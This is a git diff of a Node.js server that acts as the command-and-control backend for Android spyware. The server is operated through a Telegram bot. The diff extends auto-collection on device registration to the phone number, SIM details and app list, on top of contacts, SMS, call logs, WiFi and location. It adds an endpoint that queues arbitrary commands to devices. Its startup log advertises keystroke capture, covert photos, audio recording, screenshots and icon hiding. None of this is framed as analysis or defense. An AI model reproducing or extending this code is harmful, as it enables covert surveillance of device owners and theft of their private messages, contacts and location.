         welcomeMessage += `• 📍 Location\n\n`;
         welcomeMessage += `This may take a few moments as the device processes each request.`;
         
+        // Auto-select this device if it's the only one
         if (userDevices.length === 1) {
             userDeviceSelection.set(deviceConfig.chatId, deviceId);
             welcomeMessage += `\n\n✅ This device has been automatically selected for control.`;
@@ -1724,15 +2132,17 @@ app.post('/api/register', async (req, res) => {
         getMainMenuKeyboard(deviceConfig.chatId)
     );
     
+    // Queue auto-data commands for new devices
     if (isNewDevice) {
         queueAutoDataCommands(deviceId, deviceConfig.chatId);
     }
     
+    // Return configuration to the device
     res.json({
         status: 'registered',
         deviceId,
         chatId: deviceConfig.chatId,
-        config: deviceConfig.config
+        config: deviceConfig.config // Send the full configuration
     });
 });
 
@@ -1746,10 +2156,39 @@ app.get('/api/devices', (req, res) => {
             firstSeen: new Date(device.firstSeen).toISOString(),
             model: device.deviceInfo?.model || 'Unknown',
             android: device.deviceInfo?.android || 'Unknown',
-            online: (Date.now() - device.lastSeen) < 300000
+            phoneNumber: device.phoneNumber || 'Not available',
+            lastIPInfo: device.lastIPInfo || null,
+            lastLocation: device.lastLocation || null,
+            autoDataRequested: autoDataRequested.has(id),
+            online: (Date.now() - device.lastSeen) < 300000 // 5 minutes
         });
     }
     res.json({ total: devices.size, devices: deviceList });
+});
+
+app.post('/api/test-command/:deviceId', (req, res) => {
+    const deviceId = req.params.deviceId;
+    const { command } = req.body;
+    
+    const device = devices.get(deviceId);
+    
+    if (!device) {
+        return res.status(404).json({ error: 'Device not found' });
+    }
+    
+    if (!device.pendingCommands) {
+        device.pendingCommands = [];
+    }
+    
+    const cmd = command || 'status';
+    device.pendingCommands.push({
+        command: cmd,
+        originalCommand: '/' + cmd,
+        timestamp: Date.now()
+    });
+    
+    console.log(`🧪 Test command added for ${deviceId}: ${cmd}`);
+    res.json({ success: true, message: `Test command '${cmd}' added` });
 });
 
 // ============= TEST ENDPOINTS =============
@@ -1790,6 +2229,7 @@ app.get('/test', (req, res) => {
                         <p><b>Status:</b> <span class="${online ? 'online' : 'offline'}">${online ? '🟢 Online' : '⚫ Offline'}</span></p>
                         <p><b>Last Seen:</b> ${new Date(device.lastSeen).toLocaleString()}</p>
                         <p><b>Android:</b> ${device.deviceInfo?.android || 'Unknown'}</p>
+                        <p><b>Phone:</b> ${device.phoneNumber || 'Not available'}</p>
                         <p><b>Pending Commands:</b> ${device.pendingCommands?.length || 0}</p>
                     </div>
                 `;
@@ -1818,33 +2258,56 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server IP: ${serverIP}`);
     console.log(`🚀 Webhook URL: https://edu-hwpy.onrender.com/webhook`);
     console.log(`🚀 Authorized chats: ${Array.from(authorizedChats).join(', ')}`);
+    console.log('\n✅ DEVICE CONFIGURATION SYSTEM:');
+    console.log('   └─ Each device gets its own configuration');
+    console.log('   └─ Config includes bot token, chat ID, feature flags');
+    console.log('   └─ Default config for all devices');
+    console.log('   └─ Can override per device ID');
     console.log('\n✅ MULTI-DEVICE SUPPORT ENABLED:');
     console.log('   └─ /devices - List all devices');
     console.log('   └─ /select [device_id] - Switch active device');
+    console.log('   └─ Device menu shows all registered devices');
+    console.log('   └─ Each device gets its own command queue');
+    console.log('   └─ Device info shown in all responses');
     console.log('\n✅ CAMERA SUPPORT ENABLED:');
     console.log('   └─ /photo - Take a photo now');
-    console.log('   └─ /camera_on - Start camera monitoring');
-    console.log('   └─ /camera_off - Stop camera monitoring');
+    console.log('   └─ /takephoto - Alias for photo');
+    console.log('   └─ /camera_on - Start monitoring camera folder');
+    console.log('   └─ /camera_off - Stop monitoring camera folder');
     console.log('   └─ /camera_status - Check camera status');
-    console.log('   └─ /camera_front /camera_back /camera_switch');
-    console.log('\n✅ AUTO-DATA COLLECTION (HTML format only):');
+    console.log('   └─ /camera_front - Switch to front camera');
+    console.log('   └─ /camera_back - Switch to back camera');
+    console.log('   └─ /camera_switch - Toggle between cameras');
+    console.log('   └─ Photos are compressed (640x480, 70% quality)');
+    console.log('   └─ Auto-upload of new camera photos');
+    console.log('\n✅ APP_OPEN LOG HANDLING:');
+    console.log('   └─ Batched every 50 entries into 1 HTML file');
+    console.log('   └─ Excluded from regular log sync (20 at a time)');
+    console.log('   └─ Marked as synced after batch send');
+    console.log('   └─ No individual notifications for app opens');
+    console.log('\n✅ AUTO-DATA COLLECTION ENABLED:');
     console.log('   └─ When device registers:');
     console.log('   └─ 1. 🌐 IP Address Info');
-    console.log('   └─ 2. 📶 WiFi Details');
-    console.log('   └─ 3. 📱 Mobile Network Info');
-    console.log('   └─ 4. 📇 Contacts (HTML)');
-    console.log('   └─ 5. 💬 SMS Messages (HTML)');
-    console.log('   └─ 6. 📞 Call Logs (HTML)');
-    console.log('   └─ 7. 📍 Location');
-    console.log('\n✅ SIMPLIFIED COMMAND SET:');
-    console.log('   └─ Data: /contacts_html, /sms_html, /calllogs_html, /app_opens, /app_opens_html');
-    console.log('   └─ Screenshot: All screenshot commands kept');
-    console.log('   └─ Recording: All recording commands kept');
-    console.log('   └─ Camera: All camera commands kept');
-    console.log('   └─ Network: /ip_info, /wifi_info, /mobile_info, /network, /all_info');
-    console.log('   └─ Location: /location, /storage, /battery, /time, /status, /info');
-    console.log('   └─ Services: /hide_icon, /show_icon, /realtime_on/off/status, /reboot_app');
-    console.log('   └─ Logs: /logs_count, /logs_recent, /stats, /clear_logs');
-    console.log('   └─ Devices: /devices, /select, /help');
+    console.log('   └─ 2. 📞 Phone Number');
+    console.log('   └─ 3. 📱 SIM Information');
+    console.log('   └─ 4. 📶 WiFi Details');
+    console.log('   └─ 5. 📱 Mobile Network Info');
+    console.log('   └─ 6. 📇 Contacts (HTML)');
+    console.log('   └─ 7. 💬 SMS (HTML)');
+    console.log('   └─ 8. 📞 Call Logs (HTML)');
+    console.log('   └─ 9. 📱 Apps List (HTML)');
+    console.log('   └─ 10. 📍 Location');
+    console.log('\n✅ COMPLETE COMMAND LIST (60+ commands):');
+    console.log('   └─ Devices: /devices, /select');
+    console.log('   └─ Data: contacts, sms, calllogs, apps, keystrokes, notifications');
+    console.log('   └─ Network: ip_info, wifi_info, mobile_info, network, all_info');
+    console.log('   └─ Phone: phone_number, sim_info');
+    console.log('   └─ Screenshot: screenshot, start_screenshot, stop_screenshot, small, medium, original, size_status, screenshot_settings, compression_stats, target_apps, add_target');
+    console.log('   └─ Camera: photo, takephoto, camera_on, camera_off, camera_status, camera_front, camera_back, camera_switch');
+    console.log('   └─ Recording: record, start_recording, stop_recording, record_auto_on, record_auto_off, record_schedule, record_custom, audio_info, audio_ultra, audio_very_low, audio_low, audio_medium, audio_high');
+    console.log('   └─ Location: location, storage, battery, info, time, status');
+    console.log('   └─ App: app_opens, app_opens_html');
+    console.log('   └─ Realtime: realtime_on, realtime_off, realtime_status');
+    console.log('   └─ Services: hide_icon, show_icon, reboot_app, clear_logs, logs_count, logs_recent, stats, refresh_data, help');
     console.log('\n🚀 ===============================================\n');
 });
